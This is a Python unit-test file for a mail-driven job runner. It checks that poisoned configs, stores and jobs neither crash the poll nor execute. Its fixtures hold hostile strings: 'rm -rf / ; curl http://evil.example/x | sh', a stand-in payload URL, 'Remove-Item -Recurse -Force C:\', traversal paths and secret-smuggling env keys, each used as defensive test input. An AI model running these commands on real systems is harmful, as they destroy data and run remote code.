#!/usr/bin/env python3
"""Negative cases from a working extension simulation.

The Oracle shares one poll with the board, the reviewer, the resource
monitor, the senses, and the DRI pager. The simulation wrote garbage
into those stores (a board file that was a JSON list, a numeric
capability list, a DRI cursor that was a word, a resource sample that
was a string, a sense record whose detail was the desktop flag) and
the poll raised. These tests are those inputs.
"""
import io
import json
import os
import sys
import tempfile
import time
import unittest
from contextlib import redirect_stdout
from datetime import datetime, timezone
from email.message import EmailMessage
from unittest import mock

REPO = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
sys.path.insert(0, REPO)

from runner import dri, jobcrypto, resources, review  # noqa: E402
from runner.runner import (  # noqa: E402
    _redact_patterns,
    answer_queries,
    poll_once,
    query_budget,
    run_inspect,
    sign_payload,
    verify_body,
)

SECRET = "c4e8b1a97d2f6053e8a1c7b9e2f4d8065a3c8e1b7d9f2a4c6e8b1d3f5a7c9e2b4d"
FLAG = "FLAG-CRED-9f3c2a7e1b"


def _now():
    return datetime.now(timezone.utc).strftime("%Y-%m-%dT%H:%M:%SZ")


def _mail(subject, body):
    # Job mails travel encrypted since the HMAC-only form was
    # removed: a well-formed signed job is enveloped here so
    # its poisoned CONTENT is what the poll meets, not the
    # form refusal. Other mail types (query, task_*) keep the
    # plain signed form their handlers read, and a body that
    # does not verify (a deliberately malformed fixture)
    # passes through byte-identical.
    if subject.startswith("[HOMING-PIGEON] job "):
        try:
            payload = verify_body(body, SECRET)
        except Exception:
            payload = None
        if isinstance(payload, dict) \
                and payload.get("type") == "job":
            body = jobcrypto.encrypt_body(
                body, SECRET, job_id=payload.get("job_id") or "",
                key_id=payload.get("key_id") or "",
                sign=sign_payload)
    msg = EmailMessage()
    msg["Subject"] = subject
    msg["From"] = "si@example.com"
    msg.set_content(body)
    return msg.as_bytes()


class _IMAP:
    def __init__(self, raw):
        self.raw = raw

    def search(self, *args):
        return "OK", [b"1"]

    def fetch(self, num, what):
        return "OK", [(b"1 (RFC822)", self.raw)]

    def store(self, *args, **kwargs):
        return "OK", []


class _SMTP:
    def sendmail(self, *args, **kwargs):
        return None


class _Opts:
    dry_run = False
    no_send = True


class ExtensionPoisonTest(unittest.TestCase):
    def test_list_board_and_numeric_capabilities_do_not_crash_the_poll(self):
        with tempfile.TemporaryDirectory() as d:
            with open(os.path.join(d, "board.json"), "w", encoding="utf-8") as fh:
                json.dump(["not", "a", "board"], fh)
            body = sign_payload({
                "v": 1, "type": "task_request", "issued_at": _now(),
                "capabilities": 5,
            }, SECRET)
            raw = _mail("[HOMING-PIGEON] task_request worker-1", body)
            cfg = {
                "mailbox_user": "pigeon-test@example.com",
                "shared_secret": SECRET,
                "worker_compartments": {"worker-1": 5},
                "require_review": True,
                "dag_mode": "enforce",
            }
            poll_once(cfg, d, {}, os.path.join(d, "seen.json"),
                      imap=_IMAP(raw), smtp=_SMTP(), opts=_Opts())

    def test_review_accepts_a_job_whose_fields_are_the_wrong_type(self):
        notes = review.review_job({
            "review_patterns_extra": [{
                "id": "kf-flag",
                "pattern": "FLAG-CRED",
                "note": "script names the desktop flag",
                "severity": "warn",
            }],
        }, {
            "kind": "ping",
            "script": {"not": "text"},
            "files": "not-a-list",
            "interpreter": "bash",
            "timeout_sec": {"too": "big"},
        })
        self.assertIn("notes", notes)
        self.assertNotIn(FLAG, json.dumps(notes))

    def test_poisoned_dri_and_resource_state_do_not_raise(self):
        with tempfile.TemporaryDirectory() as d:
            with open(os.path.join(d, "dri-state.json"), "w", encoding="utf-8") as fh:
                json.dump({
                    "last_check": "not-a-time",
                    "last_page": {"key_probe": "never"},
                    "pending_digest": "nope",
                }, fh)
            with open(os.path.join(d, "resources.json"), "w", encoding="utf-8") as fh:
                json.dump({
                    "last_alert": {"disk": "yesterday", "cpu": []},
                    "cpu_prev": "nope",
                }, fh)
            with open(os.path.join(d, "security-events.jsonl"), "w", encoding="utf-8") as fh:
                fh.write("not json\n")
                fh.write(json.dumps({
                    "type": "resource_pressure",
                    "at": _now(),
                    "threshold": "high",
                    "resources": {"disk": "full", "cpu": None},
                }) + "\n")
            cfg = {
                "resources": {"enabled": True, "threshold": 0.0, "cooldown_sec": 0},
                "dri": {
                    "enabled": True,
                    "channel": "telegram",
                    "triggers": {
                        "resource_pressure": True,
                        "key_probe": {"threshold": 1, "window_sec": 3600},
                        "sensor_fused_score": {"threshold": 0.1, "window_sec": 3600},
                    },
                    "cooldown_sec": 0,
                    "digest_window_sec": 0,
                },
            }
            event = resources.check_resources(cfg, d)
            self.assertTrue(event is None or event.get("type") == "resource_pressure")
            with mock.patch.object(dri, "_send", return_value=False):
                # Bad cursor is a first run. The next cycle reads the
                # poisoned event and must still return, not raise.
                self.assertEqual(dri.maybe_page(cfg, d), 0)
                dri.maybe_page(cfg, d)
            with open(os.path.join(d, "dri-state.json"), encoding="utf-8") as fh:
                state = json.load(fh)
            self.assertIsInstance(state.get("last_check"), float)

    def test_senses_answer_redacts_a_string_detail(self):
        with tempfile.TemporaryDirectory() as d:
            with open(os.path.join(d, "senses.jsonl"), "w", encoding="utf-8") as fh:
                fh.write(json.dumps([1, 2, 3]) + "\n")
                fh.write(json.dumps({
                    "sensor": "host_ids",
                    "severity": {"bad": True},
                    "title": {"not": "a string"},
                    "weight": "lots",
                    "detail": FLAG,
                    "received_at": _now(),
                }) + "\n")
            cfg = {"redact_patterns_extra": {"flag": r"FLAG-CRED-[0-9a-f]{10}"}}
            answers, spent = answer_queries(
                [{"op": "senses", "sensor": 1, "limit": "many"}],
                {"stdout": "", "stderr": "", "exit_code": 0},
                _redact_patterns(cfg),
                budget=2,
                cfg=cfg,
                view="attested",
                base_dir=d,
            )
        blob = json.dumps(answers)
        self.assertEqual(spent, 1)
        self.assertNotIn(FLAG, blob)
        self.assertIn("[REDACTED:flag]", blob)
        self.assertEqual(answers[0]["op"], "senses")


class MistypedConfigTest(unittest.TestCase):
    """Second simulation: the config and the job shape were the wrong types.

    output_retention_days was the word "week", protected_paths was the
    number 5, workspace_root was the number 5, and the job's
    result_policy was the string "attested". The retention word killed
    the poll before mail was read. The number 5 killed the job after
    the ping ran, and the runner scheduled it to run again.
    """

    def test_mistyped_retention_and_paths_do_not_retry_the_job(self):
        with tempfile.TemporaryDirectory() as d:
            body = sign_payload({
                "v": 1, "type": "job", "job_id": "job-shape",
                "issued_at": _now(), "kind": "ping",
                "result_policy": "attested",
            }, SECRET)
            raw = _mail("[HOMING-PIGEON] job job-shape", body)
            cfg = {
                "mailbox_user": "pigeon-test@example.com",
                "shared_secret": SECRET,
                "output_retention_days": "week",
                "max_query_budget": "eight",
                "protected_paths": 5,
                "workspace_root": 5,
                "judge": "off",
            }
            seen = {}
            poll_once(cfg, d, seen, os.path.join(d, "seen.json"),
                      imap=_IMAP(raw), smtp=_SMTP(), opts=_Opts())
            self.assertIn("job-shape", seen)
            self.assertEqual(query_budget(cfg, {"result_policy": "attested"}), 8)


class PoisonedQueryTest(unittest.TestCase):
    """Third simulation: a follow-up query, not a question to the Oracle.

    The rate-limit file was a JSON list. The cap was the word "lots".
    The retained job had stdout 5, stderr null, a budget of "eight",
    and a view of 3. The query body mixed a string, a bad grep, a
    tail, and a senses op whose sensor was a number.
    """

    def _query(self, d):
        os.makedirs(os.path.join(d, "retained"))
        with open(os.path.join(d, "query_times.json"), "w", encoding="utf-8") as fh:
            json.dump([1, 2, "nope"], fh)
        with open(os.path.join(d, "retained", "job-q.json"), "w", encoding="utf-8") as fh:
            json.dump({
                "stdout": 5, "stderr": None, "spent": "many",
                "budget": "eight", "patterns": ["not", "a", "dict"],
                "view": 3, "saved_at": time.time(),
            }, fh)
        body = sign_payload({
            "v": 1, "type": "query", "query_id": "q1", "job_id": "job-q",
            "issued_at": _now(),
            "queries": [
                "not-an-object",
                {"op": "grep", "pattern": "("},
                {"op": "tail"},
                {"op": "senses", "sensor": 1},
            ],
        }, SECRET)
        return _mail("[HOMING-PIGEON] query q1", body)

    def test_word_cap_and_list_store_do_not_crash(self):
        with tempfile.TemporaryDirectory() as d:
            cfg = {
                "mailbox_user": "pigeon-test@example.com",
                "shared_secret": SECRET,
                "max_queries_per_hour": "lots",
                "max_query_budget": "eight",
                "base_dir": d,
            }
            seen = {}
            poll_once(cfg, d, seen, os.path.join(d, "seen.json"),
                      imap=_IMAP(self._query(d)), smtp=_SMTP(), opts=_Opts())
            self.assertIn("query:q1", seen)

            class Args:
                inspect = "budget"
                job_id = None

            buf = io.StringIO()
            with redirect_stdout(buf):
                self.assertEqual(run_inspect(cfg, Args()), 0)
            self.assertNotIn("Traceback", buf.getvalue())

    def test_poisoned_retained_output_still_answers(self):
        with tempfile.TemporaryDirectory() as d:
            cfg = {
                "mailbox_user": "pigeon-test@example.com",
                "shared_secret": SECRET,
                "max_queries_per_hour": 0,
                "max_query_budget": "eight",
            }
            seen = {}
            poll_once(cfg, d, seen, os.path.join(d, "seen.json"),
                      imap=_IMAP(self._query(d)), smtp=_SMTP(), opts=_Opts())
            self.assertIn("query:q1", seen)


class NumericBoardTaskTest(unittest.TestCase):
    """Fifth simulation: a board submit, not a question.

    task_id was the number 5, priority was the word high, requires
    was a script name, and capabilities was an object. The number
    reached re.fullmatch and the worker raised TypeError.
    """

    def test_numeric_task_id_is_rejected_without_a_crash(self):
        from runner.runner import Board
        with tempfile.TemporaryDirectory() as d:
            board = Board(os.path.join(d, "board.json"))
            ok, reason = board.submit({
                "task_id": 5,
                "priority": "high",
                "requires": "setup.sh",
                "capabilities": {"shell": True},
                "payload": {"detail": FLAG},
            })
            self.assertFalse(ok)
            self.assertEqual(reason, "invalid task_id")
            ok, reason = board.submit(["not", "a", "task"])
            self.assertFalse(ok)
            self.assertEqual(reason, "invalid task")
            self.assertEqual(board.tasks, {})

            body = sign_payload({
                "v": 1, "type": "task_submit", "issued_at": _now(),
                "task_id": 5,
                "priority": "high",
                "requires": "setup.sh",
                "capabilities": {"shell": True},
                "payload": {"detail": FLAG},
            }, SECRET)
            raw = _mail("[HOMING-PIGEON] task_submit board-1", body)
            cfg = {
                "mailbox_user": "pigeon-test@example.com",
                "shared_secret": SECRET,
                "require_review": True,
            }
            poll_once(cfg, d, {}, os.path.join(d, "seen.json"),
                      imap=_IMAP(raw), smtp=_SMTP(), opts=_Opts())
            self.assertFalse(os.path.exists(os.path.join(d, "work")))
            path = os.path.join(d, "board.json")
            if os.path.exists(path):
                with open(path, encoding="utf-8") as fh:
                    stored = json.load(fh)
                self.assertNotIn("5", stored)
                self.assertNotIn(FLAG, json.dumps(stored))


if __name__ == "__main__":
    unittest.main(verbosity=2)


class SensorCostumeTest(unittest.TestCase):
    """A sensor alert that is trying to be an exec job.

    It carries a script, a non-https script_url, a sensor name that
    walks out of the store, and a detail that is the desktop flag.
    The Oracle must reject it, never execute it, and not crash.
    """

    def test_sensor_alert_wearing_an_exec_costume_does_not_run(self):
        with tempfile.TemporaryDirectory() as d:
            outside = os.path.join(d, "outside")
            os.makedirs(outside)
            marker = os.path.join(outside, "ran")
            job = {
                "v": 1, "type": "job", "kind": "sensor_alert",
                "job_id": "costume-1", "issued_at": _now(),
                "sensor": "../outside",
                "severity": "critical",
                "title": "rm -rf / ; curl http://evil.example/x | sh",
                "detail": FLAG,
                "script": f"import pathlib; pathlib.Path({marker!r}).write_text('ran')",
                "script_url": "http://evil.example/payload",
                "files": [{"name": "../outside/planted", "content": "x"}],
            }
            raw = _mail("[HOMING-PIGEON] job costume-1",
                        sign_payload(job, SECRET))
            cfg = {
                "mailbox_user": "pigeon-test@example.com",
                "shared_secret": SECRET,
                "base_dir": d,
                "sensors": {"host-ids": {"enabled": True, "key_id": "sense"}},
                "judge": "enforce",
            }
            poll_once(cfg, d, {}, os.path.join(d, "seen.json"),
                      imap=_IMAP(raw), smtp=_SMTP(), opts=_Opts())
            self.assertFalse(os.path.exists(marker))
            self.assertFalse(os.path.exists(os.path.join(outside, "planted")))
            store = os.path.join(d, "senses.jsonl")
            if os.path.exists(store):
                self.assertNotIn(FLAG, open(store, encoding="utf-8").read())

    def test_senses_query_survives_a_corrupt_store(self):
        with tempfile.TemporaryDirectory() as d:
            path = os.path.join(d, "senses.jsonl")
            with open(path, "w", encoding="utf-8") as fh:
                fh.write('{"sensor":"host-ids","severity":"high",'
                         f'"title":"ok","detail":"{FLAG}"}}\n')
                fh.write("not json at all\n")
                fh.write("42\n")
                fh.write('{"sensor":"host-ids","severity":["high"],'
                         '"title":1,"detail":{"nested":true}}\n')
            answers, spent = answer_queries(
                [{"op": "senses", "sensor": "../outside", "limit": -1}],
                {"stdout": "", "stderr": "", "exit_code": 0},
                _redact_patterns({}), query_budget({}, {}),
                cfg={"sensors": {"host-ids": {"enabled": True, "key_id": "s"}}},
                base_dir=d,
            )
            self.assertEqual(spent, 1)
            blob = json.dumps(answers)
            self.assertNotIn(FLAG, blob)
            self.assertNotIn("Traceback", blob)

    def test_extensions_do_not_crash_on_one_poll(self):
        with tempfile.TemporaryDirectory() as d:
            review.review_job({"review_patterns_extra": "nope"},
                              {"kind": "sensor_alert", "script": None})
            resources.check_resources(
                {"resources": {"enabled": True, "cpu_high": "hot"}}, d)
            dri.maybe_page(
                {"dri": {"enabled": True, "bot_token": FLAG, "chat_id": 5}}, d)
            self.assertFalse(os.path.exists(os.path.join(d, "work")))


class WindowsExtensionTest(unittest.TestCase):
    """Same poison, on a simulated Windows box.

    os.name is nt. The interpreter is PowerShell. Paths use
    backslashes. winlog is the extension that only exists here.
    None of it may crash the Oracle, and none of it may run.
    """

    def test_powershell_costume_does_not_run_on_windows(self):
        with tempfile.TemporaryDirectory() as d:
            outside = os.path.join(d, "outside")
            os.makedirs(outside)
            marker = os.path.join(outside, "ran")
            job = {
                "v": 1, "type": "job", "kind": "sensor_alert",
                "job_id": "win-costume-1", "issued_at": _now(),
                "sensor": "..\\..\\Windows\\System32",
                "severity": "critical",
                "title": "Remove-Item -Recurse -Force C:\\",
                "detail": {"note": FLAG, "path": "C:\\Users\\Public\\flag"},
                "script": f"Set-Content -Path '{marker}' -Value ran",
                "interpreter": ["powershell", "-File"],
                "script_url": "http://evil.example/p.ps1",
            }
            raw = _mail("[HOMING-PIGEON] job win-costume-1",
                        sign_payload(job, SECRET))
            cfg = {
                "mailbox_user": "pigeon-test@example.com",
                "shared_secret": SECRET,
                "base_dir": d,
                "sensors": {"host-ids": {"enabled": True, "key_id": "sense"}},
                "judge": "enforce",
            }
            with mock.patch("runner.runner.os.name", "nt"), \
                 mock.patch("runner.runner.sys.platform", "win32"):
                poll_once(cfg, d, {}, os.path.join(d, "seen.json"),
                          imap=_IMAP(raw), smtp=_SMTP(), opts=_Opts())
            self.assertFalse(os.path.exists(marker))
            store = os.path.join(d, "senses.jsonl")
            if os.path.exists(store):
                self.assertNotIn(FLAG, open(store, encoding="utf-8").read())

    def test_winlog_swallows_a_broken_event_log(self):
        from runner import winlog
        with mock.patch("runner.winlog.os.name", "nt"):
            with mock.patch.dict("sys.modules", {"ctypes": None}):
                winlog.report_event(FLAG)
                winlog.report_event(None)
                winlog.report_event("x" * 100000)
        self.assertTrue(True)

    def test_windows_extensions_share_one_poll(self):
        with tempfile.TemporaryDirectory() as d:
            with open(os.path.join(d, "board.json"), "w", encoding="utf-8") as fh:
                json.dump({"t": {"state": "open", "requires": "not-a-list"}}, fh)
            with mock.patch("runner.runner.os.name", "nt"):
                review.review_job({}, {"kind": "exec", "script": FLAG,
                                       "interpreter": ["powershell", "-File"]})
                resources.check_resources({"resources": True}, d)
                dri.maybe_page({"dri": {"enabled": True, "chat_id": "..\\x"}}, d)
                body = sign_payload({
                    "v": 1, "type": "task_request", "issued_at": _now(),
                    "capabilities": ["powershell"],
                }, SECRET)
                raw = _mail("[HOMING-PIGEON] task_request worker-1", body)
                cfg = {
                    "mailbox_user": "pigeon-test@example.com",
                    "shared_secret": SECRET,
                    "worker_allowlist": ["worker-1"],
                }
                poll_once(cfg, d, {}, os.path.join(d, "seen.json"),
                          imap=_IMAP(raw), smtp=_SMTP(), opts=_Opts())


class WindowsReservedNameTest(unittest.TestCase):
    """Windows device names and a DRI page, on a simulated nt box.

    CON, NUL, and a trailing dot are reserved or rewritten on Windows.
    A pager that fires from a poisoned event log must not crash, and
    must not be the thing that runs a job.
    """

    def test_reserved_names_do_not_escape_or_crash(self):
        from runner.runner import execute_job
        with tempfile.TemporaryDirectory() as d:
            job = {
                "v": 1, "type": "job", "kind": "exec", "job_id": "win-names",
                "script": FLAG,
                "interpreter": ["powershell", "-NoProfile", "-File"],
                "files": [
                    {"name": "CON", "url": "https://example.invalid/con"},
                    {"name": "NUL", "url": "https://example.invalid/nul"},
                    {"name": "..\\\\..\\\\Windows\\\\System32\\\\x", "url": "https://example.invalid/x"},
                    {"name": "note.txt.", "url": "https://example.invalid/dot"},
                ],
            }
            cfg = {"base_dir": d, "default_timeout_sec": 5}
            with mock.patch("runner.runner.os.name", "nt"), \
                 mock.patch("runner.runner.download", side_effect=RuntimeError("no net")), \
                 mock.patch("runner.runner.subprocess.Popen") as popen:
                try:
                    execute_job(cfg, job, d)
                except Exception as e:
                    self.assertNotIsInstance(e, (SystemExit, KeyboardInterrupt))
                popen.assert_not_called()
            work = os.path.join(d, "work")
            if os.path.isdir(work):
                for root, dirs, files in os.walk(work):
                    for name in files:
                        self.assertNotIn(FLAG, open(os.path.join(root, name),
                                                    encoding="utf-8", errors="replace").read())

    def test_dri_page_from_a_poisoned_event_does_not_crash(self):
        with tempfile.TemporaryDirectory() as d:
            now = datetime.now(timezone.utc).strftime("%Y-%m-%dT%H:%M:%SZ")
            with open(os.path.join(d, "security-events.jsonl"), "w", encoding="utf-8") as fh:
                fh.write(json.dumps({
                    "type": "confinement_violation", "at": now,
                    "detail": FLAG, "title": "CON",
                }) + "\n")
                fh.write("not-json\n")
                fh.write("null\n")
            cfg = {"dri": {
                "enabled": True, "channel": "telegram",
                "telegram_bot_token": "t", "telegram_chat_id": "1",
                "triggers": {"confinement_violation": {"enabled": True}},
                "cooldown_sec": 0,
            }}
            sent = {}

            def grab(token, chat, text):
                sent["text"] = text
                return True

            with mock.patch("runner.runner.os.name", "nt"), \
                 mock.patch("runner.dri.send_telegram", side_effect=grab):
                dri.maybe_page(cfg, d)
            self.assertNotIn("Traceback", sent.get("text", ""))

    def test_kill_tree_on_windows_survives_a_dead_pid(self):
        from runner.runner import kill_tree
        proc = mock.Mock()
        proc.pid = -1
        proc.kill.side_effect = OSError("already dead")
        with mock.patch("runner.runner.os.name", "nt"), \
             mock.patch("runner.runner.subprocess.run", side_effect=FileNotFoundError("taskkill")):
            kill_tree(proc)


class WindowsEnvAndReviewTest(unittest.TestCase):
    """Windows folds env keys and ignores shebangs.

    A job that smuggles pigeon_secret must lose it. A bash shebang
    reviewed on nt must be noted, not crash. The resource monitor
    has no /proc on Windows and must still return.
    """

    def test_env_scrub_is_case_insensitive(self):
        from runner.runner import _scrub_env
        env = {
            "PIGEON_SECRET": FLAG,
            "pigeon_secret": FLAG,
            "Pigeon_Token": FLAG,
            "PATH": "C:\\\\Windows\\\\System32",
        }
        with mock.patch("runner.runner.os.name", "nt"):
            clean = _scrub_env(env)
        self.assertNotIn("PIGEON_SECRET", clean)
        self.assertNotIn("pigeon_secret", clean)
        self.assertNotIn("Pigeon_Token", clean)
        self.assertIn("PATH", clean)
        self.assertNotIn(FLAG, json.dumps(clean))

    def test_ads_name_and_bash_shebang_do_not_crash(self):
        from runner.runner import execute_job
        with tempfile.TemporaryDirectory() as d:
            job = {
                "kind": "exec", "job_id": "ads-1",
                "script": "#!/bin/bash\\n" + FLAG,
                "interpreter": ["powershell", "-NoProfile", "-File"],
                "files": [{"name": "report.ps1:hidden", "url": "https://example.invalid/ads"}],
            }
            with mock.patch("runner.runner.os.name", "nt"), \
                 mock.patch("runner.runner.download", side_effect=RuntimeError("no net")), \
                 mock.patch("runner.runner.subprocess.Popen") as popen:
                try:
                    execute_job({"base_dir": d}, job, d)
                except Exception as e:
                    self.assertNotIsInstance(e, (SystemExit, KeyboardInterrupt))
                popen.assert_not_called()
            notes = review.review_job({}, {
                "kind": "exec", "script": "#!/bin/bash\\necho hi",
                "interpreter": ["powershell", "-File"],
            })
            with mock.patch("runner.review.os.name", "nt"):
                notes = review.review_job({}, {
                    "kind": "exec", "script": "#!/bin/bash\\necho hi",
                })
            ids = [n.get("id") for n in notes.get("notes", [])]
            self.assertIn("shebang_platform_mismatch", ids)

    def test_resources_on_windows_with_a_poisoned_state(self):
        with tempfile.TemporaryDirectory() as d:
            with open(os.path.join(d, "resources-state.json"), "w", encoding="utf-8") as fh:
                fh.write('{"prev": "not-a-sample", "cpu": "hot"}')
            with mock.patch("runner.runner.os.name", "nt"):
                resources.check_resources(
                    {"resources": {"enabled": True, "disk_path": "CON"}}, d)


class WindowsPathAndCapTest(unittest.TestCase):
    """Windows path rules and a bad output cap, from a simulation.

    os.path is ntpath. A Desktop flag path and a parent traversal are
    absolute once joined, so they must be rejected before any download.
    CON is a device name. max_output_bytes of "1MB" used to raise
    ValueError after the script was staged, which retried the job.
    """

    def _nt_patches(self):
        import ntpath
        return [
            mock.patch("runner.runner.os.name", "nt"),
            mock.patch("runner.runner.os.sep", "\\"),
            mock.patch("runner.runner.os.path.join", ntpath.join),
            mock.patch("runner.runner.os.path.realpath", ntpath.normpath),
            mock.patch("runner.runner.os.path.isdir", lambda p: True),
            mock.patch("runner.runner.os.makedirs"),
            mock.patch("runner.runner.shutil.rmtree"),
        ]

    def test_drive_and_traversal_never_download(self):
        from contextlib import ExitStack
        from runner.runner import JobRejected, execute_job
        job = {
            "kind": "exec", "job_id": "win-path",
            "script": "Write-Output 'hello'",
            "interpreter": ["powershell", "-NoProfile", "-File"],
            "files": [{
                "name": r"C:\Users\Tester\Desktop\flag.txt",
                "url": "https://example.invalid/flag",
            }],
        }
        with ExitStack() as stack:
            for p in self._nt_patches():
                stack.enter_context(p)
            download = stack.enter_context(mock.patch(
                "runner.runner.download", side_effect=AssertionError("download")))
            popen = stack.enter_context(mock.patch("runner.runner.subprocess.Popen"))
            with self.assertRaises(JobRejected) as caught:
                execute_job({"max_output_bytes": "1MB"}, job,
                            r"C:\Users\Tester\AppData\homing-pigeon")
        self.assertIn("flag.txt", str(caught.exception))
        download.assert_not_called()
        popen.assert_not_called()

        job["files"] = [{
            "name": r"..\..\Desktop\flag.txt",
            "url": "https://example.invalid/up",
        }]
        with ExitStack() as stack:
            for p in self._nt_patches():
                stack.enter_context(p)
            download = stack.enter_context(mock.patch(
                "runner.runner.download", side_effect=AssertionError("download")))
            with self.assertRaises(JobRejected):
                execute_job({}, job, r"C:\Users\Tester\AppData\homing-pigeon")
        download.assert_not_called()

    def test_device_name_is_rejected_before_download(self):
        from runner.runner import JobRejected, execute_job
        job = {
            "kind": "exec", "job_id": "win-con",
            "script": "Write-Output 'hello'",
            "interpreter": ["powershell", "-NoProfile", "-File"],
            "files": [
                {"name": "CON", "url": "https://example.invalid/con"},
                {"name": "notes.ps1.", "url": "https://example.invalid/dot"},
            ],
        }
        with tempfile.TemporaryDirectory() as d:
            with mock.patch("runner.runner.os.name", "nt"), \
                 mock.patch("runner.runner.download",
                            side_effect=AssertionError("download")) as download, \
                 mock.patch("runner.runner.subprocess.Popen") as popen:
                with self.assertRaises(JobRejected) as caught:
                    execute_job({"max_output_bytes": "1MB"}, job, d)
        self.assertIn("CON", str(caught.exception))
        download.assert_not_called()
        popen.assert_not_called()

        job["files"] = [{
            "name": "report.ps1:hidden",
            "url": "https://example.invalid/ads",
        }]
        with tempfile.TemporaryDirectory() as d:
            with mock.patch("runner.runner.os.name", "nt"), \
                 mock.patch("runner.runner.download",
                            side_effect=AssertionError("download")) as download:
                with self.assertRaises(JobRejected) as caught:
                    execute_job({}, job, d)
        self.assertIn("report.ps1:hidden", str(caught.exception))
        download.assert_not_called()

    def test_bad_output_cap_does_not_raise(self):
        from runner.runner import execute_job
        with tempfile.TemporaryDirectory() as d:
            job = {
                "kind": "exec", "job_id": "win-cap",
                "script": "Write-Output 'hello'",
                "interpreter": ["powershell", "-NoProfile", "-File"],
            }
            proc = mock.Mock()
            proc.pid = 4
            proc.returncode = 0
            proc.communicate.return_value = (b"hello\n", b"")
            with mock.patch("runner.runner.os.name", "nt"), \
                 mock.patch("runner.runner.subprocess.Popen", return_value=proc) as popen:
                result = execute_job(
                    {"max_output_bytes": "1MB", "default_timeout_sec": 5},
                    job, d)
            popen.assert_called_once()
            argv = popen.call_args.args[0]
            self.assertEqual(argv[0], "powershell")
            self.assertTrue(argv[-1].endswith("script.ps1"))
            self.assertEqual(result["stdout"], "hello\n")
            self.assertEqual(result["exit_code"], 0)


class _MultiIMAP:
    """Several messages in one poll. fetch returns the matching seq."""

    def __init__(self, raws):
        self.raws = {str(i + 1): raw for i, raw in enumerate(raws)}

    def search(self, *args):
        keys = sorted(self.raws, key=int)
        return "OK", [" ".join(keys).encode()]

    def fetch(self, num, what):
        seq = num.decode() if isinstance(num, bytes) else str(num)
        return "OK", [(b"1 (RFC822)", self.raws[seq])]

    def store(self, *args, **kwargs):
        return "OK", []


class _Workers:
    dry_run = False
    no_send = True
    workers = 4


class ConcurrencyAndExtensionFaultTest(unittest.TestCase):
    """Failures must not stop the poll, and two workers must not
    double-execute one job.

    Finding: a worker that raises fails the cycle after its siblings
    finish. The process does not die. The next poll runs. That is the
    contract these tests lock.
    """

    def _cfg(self, d):
        return {
            "mailbox_user": "pigeon-test@example.com",
            "shared_secret": SECRET,
            "base_dir": d,
            "workers": 4,
        }

    def test_duplicate_job_id_executes_once(self):
        calls = []

        def once(cfg, job, base_dir):
            calls.append(job.get("job_id"))
            return {"stdout": "pong", "stderr": "", "exit_code": 0,
                    "timed_out": False, "stdout_truncated": False,
                    "stderr_truncated": False, "duration_sec": 0.0}

        with tempfile.TemporaryDirectory() as d:
            body = sign_payload({
                "v": 1, "type": "job", "kind": "ping",
                "job_id": "same-id", "issued_at": _now(),
            }, SECRET)
            raws = [
                _mail("[HOMING-PIGEON] job same-id", body),
                _mail("[HOMING-PIGEON] job same-id", body),
            ]
            with mock.patch("runner.runner.execute_job", side_effect=once):
                poll_once(self._cfg(d), d, {}, os.path.join(d, "seen.json"),
                          imap=_MultiIMAP(raws), smtp=_SMTP(), opts=_Workers())
            self.assertEqual(calls, ["same-id"])

    def test_a_raising_extension_does_not_stop_the_poll(self):
        with tempfile.TemporaryDirectory() as d:
            body = sign_payload({
                "v": 1, "type": "job", "kind": "ping",
                "job_id": "still-runs", "issued_at": _now(),
            }, SECRET)
            raw = _mail("[HOMING-PIGEON] job still-runs", body)

            def boom(*a, **k):
                raise RuntimeError("extension on fire")

            with mock.patch("runner.runner._resources.check_resources", side_effect=boom), \
                 mock.patch("runner.runner._dri.maybe_page", side_effect=boom):
                poll_once(self._cfg(d), d, {}, os.path.join(d, "seen.json"),
                          imap=_IMAP(raw), smtp=_SMTP(), opts=_Opts())
            with open(os.path.join(d, "seen.json"), encoding="utf-8") as fh:
                seen = json.load(fh)
            self.assertIn("still-runs", seen)

    def test_concurrent_alert_writes_stay_readable(self):
        from runner import senses as S
        import threading
        with tempfile.TemporaryDirectory() as d:
            def write(i):
                S.store_alert(d, {
                    "sensor": "host-ids", "severity": "low",
                    "title": f"n{i}", "detail": {"i": i},
                })
            threads = [threading.Thread(target=write, args=(i,)) for i in range(20)]
            for t in threads:
                t.start()
            for t in threads:
                t.join()
            recs = S.load_alerts(d, limit=100)
            self.assertTrue(all(isinstance(r, dict) for r in recs))
            self.assertGreater(len(recs), 0)

    def test_sibling_job_finishes_when_one_worker_raises(self):
        ran = []

        def maybe(cfg, job, base_dir):
            ran.append(job.get("job_id"))
            if job.get("job_id") == "bad":
                raise RuntimeError("worker blew up")
            return {"stdout": "pong", "stderr": "", "exit_code": 0,
                    "timed_out": False, "stdout_truncated": False,
                    "stderr_truncated": False, "duration_sec": 0.0}

        with tempfile.TemporaryDirectory() as d:
            good = sign_payload({
                "v": 1, "type": "job", "kind": "ping",
                "job_id": "good", "issued_at": _now(),
            }, SECRET)
            bad = sign_payload({
                "v": 1, "type": "job", "kind": "ping",
                "job_id": "bad", "issued_at": _now(),
            }, SECRET)
            raws = [
                _mail("[HOMING-PIGEON] job good", good),
                _mail("[HOMING-PIGEON] job bad", bad),
            ]
            with mock.patch("runner.runner.execute_job", side_effect=maybe):
                # Finding: execute_job raising is a transient failure.
                # handle_mail catches it, leaves the job unseen so the
                # next poll retries, and does not fail the cycle.
                # The sibling job still completes.
                poll_once(self._cfg(d), d, {}, os.path.join(d, "seen.json"),
                          imap=_MultiIMAP(raws), smtp=_SMTP(), opts=_Workers())
            self.assertIn("good", ran)
            self.assertIn("bad", ran)
            with open(os.path.join(d, "seen.json"), encoding="utf-8") as fh:
                seen = json.load(fh)
            self.assertIn("good", seen)
            self.assertNotIn("bad", seen)


class ReviewAndBoardFaultTest(unittest.TestCase):
    """Finding: review_job used to run before the job, unguarded.

    A raise, or a return that is not a dict, retried the job forever
    because sign_payload could not serialize the result. The review is
    advisory. It fails open now: the job runs, the review is dropped.
    """

    def _ping(self, jid):
        return _mail("[HOMING-PIGEON] job " + jid, sign_payload({
            "v": 1, "type": "job", "kind": "ping",
            "job_id": jid, "issued_at": _now(),
        }, SECRET))

    def _cfg(self, d):
        return {"mailbox_user": "pigeon-test@example.com",
                "shared_secret": SECRET, "base_dir": d}

    def test_raising_review_does_not_stop_the_job(self):
        with tempfile.TemporaryDirectory() as d:
            with mock.patch("runner.runner._review.review_job",
                            side_effect=RuntimeError("review on fire")):
                poll_once(self._cfg(d), d, {}, os.path.join(d, "seen.json"),
                          imap=_IMAP(self._ping("rev-1")), smtp=_SMTP(),
                          opts=_Opts())
